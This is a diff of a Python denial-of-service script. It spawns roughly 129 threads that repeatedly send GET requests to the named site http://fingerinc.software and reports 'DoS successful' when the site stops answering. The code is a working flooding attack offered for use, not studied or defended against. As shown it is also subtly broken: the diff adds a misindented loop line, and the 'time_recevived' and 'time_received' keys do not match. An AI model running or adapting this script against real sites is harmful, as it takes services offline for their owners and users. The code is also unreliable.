@@ -4,37 +4,27 @@
 import requests
 import threading
 import time
-
 alpha=[]
 ralpha=[]
-
 def accurate_time():
     return round(time.time()*1000)
-
 def appox_time():
     return round(time.time())
-
 def no_of_resp_per_sec(time_took):
     t=appox_time()
     alpha.append({
         "time_took":time_took,
-        "time_recevived": t,
-    })
-
+        "time_recevived": t,})
     for e in alpha:
         if appox_time()- e["time_received"]>=1:
             alpha.remove(e)
-
 def no_of_req_per_sec():
     t= appox_time()
     ralpha.append({
-        "time_received": t,
-    }) 
-
-    for e in ralpha:
+        "time_received": t,})
+     for e in ralpha:
         if appox_time() -e["time_received"] >=1:
             ralpha.remove(e)
-
 message="DoSing..."
 def make_request(name):
     while True:
@@ -43,11 +33,10 @@ def make_request(name):
             s= accurate_time()
             r=requests.get('http://fingerinc.software')
             t= accurate_time() -s
-            #something
+            #edit required here!
             no_of_resp_per_sec(t)
         except:
             message="DoS successful, The site looks down for now."
-
 threads=128
 i=0
 while i <= threads:
@@ -55,8 +44,6 @@ while i <= threads:
     print("Starting thread #{}...".format(i))
     x.start()
     i+=1
-
-
 print("Calculating... wait for a while for it to adjust...")
 while True:
     time.sleep(0.1)
